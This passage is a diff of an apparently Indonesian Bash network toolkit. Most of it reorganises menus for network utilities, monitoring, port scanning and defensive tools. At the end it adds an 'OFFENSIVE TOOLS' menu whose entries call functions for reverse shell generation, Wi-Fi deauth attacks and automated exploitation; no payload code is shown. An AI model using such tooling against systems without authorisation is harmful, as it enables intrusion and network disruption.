-          4)  cmd_set_ip_manual; log_save "Set IP manual" ;;
-          5)  cmd_routing ;;
-          6)  cmd_dns_check ;;
-          7)  cmd_internet_check ;;
-          8)  cmd_scan_ssh ;;
-          9)  cmd_ssh_connect ;;
-          10) cmd_reset_ip; log_save "Reset IP DHCP" ;;
-          11) break ;;
+  	  1)
+    	    while true; do
+      	      if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}   NETWORK UTILITIES${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1.  Lihat IP"
+              echo "2.  Scan Jaringan"
+              echo "3.  Ping IP"
+              echo "4.  Set IP Manual"
+              echo "5.  Routing"
+              echo "6.  DNS Check"
+              echo "7.  Internet Check"
+              echo "8.  Scan SSH Device"
+              echo "9.  SSH Connect"
+              echo "10. Reset IP"
+              echo "11. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " netmenu || continue
+              case $netmenu in
+                1)  cmd_lihat_ip;      log_save "Lihat IP" ;;
+                2)  cmd_scan_jaringan; log_save "Scan jaringan" ;;
+                3)  cmd_ping_ip;       log_save "Ping IP" ;;
+                4)  cmd_set_ip_manual; log_save "Set IP manual" ;;
+                5)  cmd_routing ;;
+                6)  cmd_dns_check ;;
+                7)  cmd_internet_check ;;
+                8)  cmd_scan_ssh ;;
+                9)  cmd_ssh_connect ;;
+                10) cmd_reset_ip;      log_save "Reset IP DHCP" ;;
+                11) break ;;
+              esac
+            done
+            ;;
+
+          2)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}   NETWORK MONITOR${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. ARP Watch"
+              echo "2. Connection Monitor"
+              echo "3. DHCP Snooping"
+              echo "4. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " monmenu || continue
+              case $monmenu in
+                1) cmd_arp_watch;     log_save "ARP Watch" ;;
+                2) cmd_conn_monitor;  log_save "Connection Monitor" ;;
+                3) cmd_dhcp_snooping; log_save "DHCP Snooping" ;;
+                4) break ;;
+              esac
+            done
+            ;;
+
+          3)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}   NETWORK CONTROL${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. IP Blocklist"
+              echo "2. MAC Whitelist"
+              echo "3. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " ctrlmenu || continue
+              case $ctrlmenu in
+                1) cmd_ip_blocklist;  log_save "IP Blocklist" ;;
+                2) cmd_mac_whitelist; log_save "MAC Whitelist" ;;
+                3) break ;;
+              esac
+            done
+            ;;
+
+          4) break ;;
         esac
 
       done
@@ -2052,27 +2970,65 @@ while true; do
         fi
 
         echo -e "${CYAN}=========================${NC}"
-        echo -e "${GREEN}        TCP TOOLS${NC}"
-        echo -e "${CYAN}=========================${NC}"
-        echo "1. Scan Port"
-        echo "2. Service Detection"
-        echo "3. Range Scan"
-        echo "4. Specific Port"
-        echo "5. Local Ports"
-        echo "6. Banner Grab"
-        echo "7. Kembali"
-        echo -e "${CYAN}=========================${NC}"
+	echo -e "${GREEN}        TCP TOOLS${NC}"
+	echo -e "${CYAN}=========================${NC}"
+	echo "1. Port Scanner"
+	echo "2. TCP Defensive"
+	echo "3. Kembali"
+	echo -e "${CYAN}=========================${NC}"
 
         IFS= read -r -p "Pilih menu: " tcpmenu || continue
 
         case $tcpmenu in
-          1) cmd_tcp_scan_port ;;
-          2) cmd_tcp_service_detection ;;
-          3) cmd_tcp_range_scan ;;
-          4) cmd_tcp_specific_port ;;
-          5) cmd_tcp_local_ports ;;
-          6) cmd_tcp_banner_grab ;;
-          7) break ;;
+          1)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}     PORT SCANNER${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. Scan Port"
+              echo "2. Service Detection"
+              echo "3. Range Scan"
+              echo "4. Specific Port"
+              echo "5. Local Ports"
+              echo "6. Banner Grab"
+              echo "7. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " scanmenu || continue
+              case $scanmenu in
+                1) cmd_tcp_scan_port ;;
+                2) cmd_tcp_service_detection ;;
+                3) cmd_tcp_range_scan ;;
+                4) cmd_tcp_specific_port ;;
+                5) cmd_tcp_local_ports ;;
+                6) cmd_tcp_banner_grab ;;
+                7) break ;;
+              esac
+            done
+            ;;
+
+          2)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}    TCP DEFENSIVE${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. Port Knocking Setup"
+              echo "2. Fail2Ban Monitor"
+              echo "3. SYN Flood Detector"
+              echo "4. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " defmenu || continue
+              case $defmenu in
+                1) cmd_port_knock_setup;  log_save "Port Knock Setup" ;;
+                2) cmd_fail2ban_status;   log_save "Fail2Ban Status" ;;
+                3) cmd_syn_flood_detect;  log_save "SYN Flood Detect" ;;
+                4) break ;;
+              esac
+            done
+            ;;
+
+          3) break ;;
         esac
 
       done
@@ -2089,15 +3045,16 @@ while true; do
         fi
 
         echo -e "${CYAN}=========================${NC}"
-        echo -e "${YELLOW}     STORAGE MODE${NC}"
-        echo -e "${CYAN}=========================${NC}"
-        echo "1. Local Mode"
-        echo "2. USB Mode"
-        echo "3. Installer"
-        echo "4. Save Log"
-        echo "5. USB Tools"
-        echo "6. Kembali"
-        echo -e "${CYAN}=========================${NC}"
+	echo -e "${YELLOW}     STORAGE MODE${NC}"
+	echo -e "${CYAN}=========================${NC}"
+	echo "1. Local Mode"
+	echo "2. USB Mode"
+	echo "3. Installer"
+	echo "4. Save Log"
+	echo "5. USB Tools"
+	echo "6. Security"
+	echo "7. Kembali"
+	echo -e "${CYAN}=========================${NC}"
 
         IFS= read -r -p "Pilih menu: " smode || continue
 
@@ -2143,8 +3100,28 @@ while true; do
 
             done
             ;;
+           
+          6)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+      	      echo -e "${GREEN}       SECURITY${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. Log Integrity Check"
+              echo "2. File Monitor"
+              echo "3. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " secmenu || continue
+              case $secmenu in
+                1) cmd_log_integrity_check; log_save "Log Integrity Check" ;;
+                2) cmd_file_monitor;        log_save "File Monitor" ;;
+                3) break ;;
+              esac
+            done
+            ;;
 
-          6) break ;;
+          7) break ;; 
+
         esac
 
       done
@@ -2349,7 +3326,45 @@ while true; do
 
       done
       ;;
+    
+    # =====================
+    # 💀 OFFENSIVE TOOLS
+    # =====================
+    menu_offensive)
+      echo -e "${RED}=================================${NC}"
+      echo -e "${RED} [!] AUTHORIZED USE ONLY [!]${NC}"
+      echo -e "${RED} [!] ALL ACTIONS LOGGED [!]${NC}"
+      echo -e "${RED}=================================${NC}"
+      sleep 2
 
+      while true; do
+        if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+
+        echo -e "${RED}=========================${NC}"
+        echo -e "${RED} OFFENSIVE TOOLS${NC}"
+        echo -e "${RED}=========================${NC}"
+        echo "1. Nmap Vuln Scan"
+        echo "2. Masscan Aggressive"
+        echo "3. Reverse Shell Gen"
+        echo "4. Wifi Deauth Attack"
+        echo "5. Exploit Autopwn"
+        echo "6. Kembali"
+        echo -e "${RED}=========================${NC}"
+
+        IFS= read -r -p "Pilih menu: " offmenu || continue
+
+        case $offmenu in
+          1) cmd_nmap_vuln_scan ;;
+          2) cmd_masscan_aggressive ;;
+          3) cmd_reverse_shell_gen ;;
+          4) cmd_wifi_deauth_attack ;;
+          5) cmd_exploit_autopwn ;;
+          6) break ;;
+          *) print_error "Invalid option" ;;
+        esac
+      done
+      ;;
+    
     # =====================
     # 🚪 EXIT
     # =====================
